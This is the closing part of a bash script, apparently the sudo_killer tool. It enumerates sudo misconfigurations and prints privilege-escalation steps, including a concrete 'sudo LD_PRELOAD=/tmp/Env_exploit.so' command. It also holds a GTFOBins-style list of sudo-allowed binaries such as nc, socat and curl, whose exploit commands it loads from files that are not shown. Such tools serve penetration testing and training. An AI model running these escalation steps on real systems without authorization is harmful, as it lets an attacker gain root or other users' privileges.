# check for LD_PRELOAD

sudoenvld_preload=$(echo "$cmd" 2>/dev/null | grep "LD_PRELOAD" )  
if [ "$sudoenvld_preload" ]; then
echo -e "${BOLD}${GREEN}[+] LD_PRELOAD is set and is a dangerous environment variable.${RESET}"
echo -e "[-] Notes on the exploitation of LD_PRELOAD : /notes/env_exploit.txt"
echo -e "[-] Exploit :" 
echo -e "     Step 1: Copy the library /exploits/Env_exploit.so to tmp directory."
echo -e "     Step 2: sudo LD_PRELOAD=/tmp/Env_exploit.so [a bin that can be executed with sudo such as cp/find] \n"

else
  :
fi


echo -e "${BOLD}${GREEN}[+] Checking for dangerous environment variables such as PS4, PERL5OPT, PYTHONINSPECT,... .${RESET}"

#>> use /exploits/Dangerous_env_var.txt

cat exploits/Dangerous_env_var.txt | while read linen1
do
sudoenvvar=$(echo "$cmd" 2>/dev/null | grep "$linen1" )
if [ "$sudoenvvar" ]; then
echo "The dangerous environment variable $linen1 is set within sudo and is potentially vulnerable."
else
  :
fi


done

echo -e "\n"



}




checkdangbin()
{

#####  Check for dangerous bin

function fn_dngbin2 ()
{

var2=" "

if [ "$2" = "root" ];
then    
var2=$(echo "$cmd" 2>/dev/null | grep "(root) NOPASSWD:" | grep -w "bin/$1")
if [ "$var2" ]; then
  echo -e "[+] Sudo $1, was found "
fi
fi

if [ "$2" = "other" ];
then
var2=$(echo "$cmd" 2>/dev/null | grep ") NOPASSWD:" | grep -v "root" | grep -w "bin/$1")


if [ "$var2" ]; then
echo -e "[+] Sudo $1, was found "
usr=$(echo "$cmd" 2>/dev/null | grep ") NOPASSWD:" | grep -v "root" | grep -w "bin/$1" | cut -d ")" -f 1 | sed 's/(//g' )
path1=$(echo "$cmd" 2>/dev/null | grep ") NOPASSWD:" | grep -v "root" | grep -w "bin/$1" | cut -d ":" -f 2 | sed 's/(//g')
echo "[+] run the command: sudo -u "$usr" "$path1" <cmd>"
echo "[*] where <cmd> is as below:"
fi

fi

if [ "$var2" ]; then
  echo -e "Run the following commands :"
  resgrep=`echo '' | cat exploits/"$1".txt | grep -v "\* Sudo \*"`
  echo -e "$resgrep"
  resgrep=""
  echo -e "\n"
fi
}


function fn_bins ()
{

fn_dngbin2 "apt" "$1"
fn_dngbin2 "apt-get" "$1"
fn_dngbin2 "aria2c" "$1"
fn_dngbin2 "ash" "$1"
fn_dngbin2 "apache2" "$1"
fn_dngbin2 "awk" "$1"
fn_dngbin2 "base64" "$1"
fn_dngbin2 "bash" "$1"
fn_dngbin2 "busybox" "$1"
fn_dngbin2 "cat" "$1"
fn_dngbin2 "chmod" "$1"
fn_dngbin2 "chown" "$1"
fn_dngbin2 "cp" "$1"
fn_dngbin2 "cpan" "$1"
fn_dngbin2 "cpulimit" "$1"
fn_dngbin2 "crontab" "$1"
fn_dngbin2 "csh" "$1"
fn_dngbin2 "curl" "$1"
fn_dngbin2 "cut" "$1"
fn_dngbin2 "dash" "$1"
fn_dngbin2 "date" "$1"
fn_dngbin2 "dd" "$1"
fn_dngbin2 "diff" "$1"
fn_dngbin2 "docker" "$1"
fn_dngbin2 "ed" "$1"
fn_dngbin2 "emacs" "$1"
fn_dngbin2 "env" "$1"
fn_dngbin2 "expand" "$1"
fn_dngbin2 "expect" "$1"
fn_dngbin2 "facter" "$1"
fn_dngbin2 "find" "$1"
fn_dngbin2 "finger" "$1"
fn_dngbin2 "flock" "$1"
fn_dngbin2 "fmt" "$1"
fn_dngbin2 "fold" "$1"
fn_dngbin2 "ftp" "$1"
fn_dngbin2 "gdb" "$1"
fn_dngbin2 "git" "$1"
fn_dngbin2 "head" "$1"
fn_dngbin2 "ionice" "$1"
fn_dngbin2 "jq" "$1"
fn_dngbin2 "ksh" "$1"
fn_dngbin2 "ld.so" "$1"
fn_dngbin2 "less" "$1"
fn_dngbin2 "ltrace" "$1"
fn_dngbin2 "lua" "$1"
fn_dngbin2 "mail" "$1"
fn_dngbin2 "make" "$1"
fn_dngbin2 "man" "$1"
fn_dngbin2 "more" "$1"
fn_dngbin2 "mount" "$1"
fn_dngbin2 "mv" "$1"
fn_dngbin2 "mysql" "$1"
fn_dngbin2 "nano" "$1"
fn_dngbin2 "nc" "$1"
fn_dngbin2 "nice" "$1"
fn_dngbin2 "nl" "$1"
fn_dngbin2 "nmap" "$1"
fn_dngbin2 "node" "$1"
fn_dngbin2 "od" "$1"
fn_dngbin2 "perl" "$1"
fn_dngbin2 "pg" "$1"
fn_dngbin2 "php" "$1"
fn_dngbin2 "pico" "$1"
fn_dngbin2 "pip" "$1"
fn_dngbin2 "puppet" "$1"
fn_dngbin2 "python2" "$1"
fn_dngbin2 "python3" "$1"
fn_dngbin2 "red" "$1"
fn_dngbin2 "rlwrap" "$1"
fn_dngbin2 "rpm" "$1"
fn_dngbin2 "rpmquery" "$1"
fn_dngbin2 "rsync" "$1"
fn_dngbin2 "ruby" "$1"
fn_dngbin2 "scp" "$1"
fn_dngbin2 "sed" "$1"
fn_dngbin2 "setarch" "$1"
fn_dngbin2 "sftp" "$1"
fn_dngbin2 "shuf" "$1"
fn_dngbin2 "smbclient" "$1"
fn_dngbin2 "socat" "$1"
fn_dngbin2 "sort" "$1"
fn_dngbin2 "sqlite3" "$1"
fn_dngbin2 "ssh" "$1"
fn_dngbin2 "stdbuf" "$1"
fn_dngbin2 "strace" "$1"
fn_dngbin2 "tail" "$1"
fn_dngbin2 "tar" "$1"
fn_dngbin2 "taskset" "$1"
fn_dngbin2 "tclsh" "$1"
fn_dngbin2 "tcpdump" "$1"
fn_dngbin2 "tee" "$1"
fn_dngbin2 "telnet" "$1"
fn_dngbin2 "tftp" "$1"
fn_dngbin2 "time" "$1"
fn_dngbin2 "timeout" "$1"
fn_dngbin2 "ul" "$1"
fn_dngbin2 "unexpand" "$1"
fn_dngbin2 "uniq" "$1"
fn_dngbin2 "unshare" "$1"
fn_dngbin2 "vi" "$1"
fn_dngbin2 "vim" "$1"
fn_dngbin2 "watch" "$1"
fn_dngbin2 "wget" "$1"
fn_dngbin2 "whois" "$1"
fn_dngbin2 "wish" "$1"
fn_dngbin2 "xargs" "$1"
fn_dngbin2 "xxd" "$1"
fn_dngbin2 "zip" "$1"
fn_dngbin2 "zsh" "$1"

}



# echo -e "\n" 
echo -e "${BOLD}${YELLOW}============== Checking for Dangerous binaries within sudo ================== ${RESET} \n"

echo -e "[-] dangerous bins (https://gtfobins.github.io/#+sudo): "

echo -e "${BOLD}${GREEN}[+] Dangerous bins to escalate to root: ${RESET}"
# check bins for root
fn_bins "root"

echo -e "${BOLD}${GREEN}[+] Dangerous bins to escalate to other users: ${RESET}"
echo -e "Remember to run command as follow sudo -u [USER] /path/bin" 
# check bins for other users
fn_bins "other"


}

while getopts "hceri:p:" option; do
case "${option}"
in
h) usage; exit;;
c) sudocve="1";;
e) exports="1";;
r) report=${OPTARG};;
i) import=${OPTARG};;
p) path=${OPTARG};;
*) usage; exit;;
esac
done


call_each()
{
  header
 # usage
  init
  intro
  checkinitial
  checkcve
  checkmisconfig
  checkdangenvar
  checkdangbin
  footer
}

if [ "$path" ]; then 
mkdir -p /$path/sudo_killer-export-`date +"%d-%m-%y"` 2>/dev/null
call_each | tee -a /$path/sudo_killer-export-`date +"%d-%m-%y"`/$report 2> /dev/null
else
:
if [ "$report" ] || [ "$export" ]; then 
mkdir -p /tmp/sudo_killer-export-`date +"%d-%m-%y"` 2>/dev/null
call_each | tee -a /tmp/sudo_killer-export-`date +"%d-%m-%y"`/$report 2> /dev/null
else
:
call_each 2> /dev/null
fi

fi
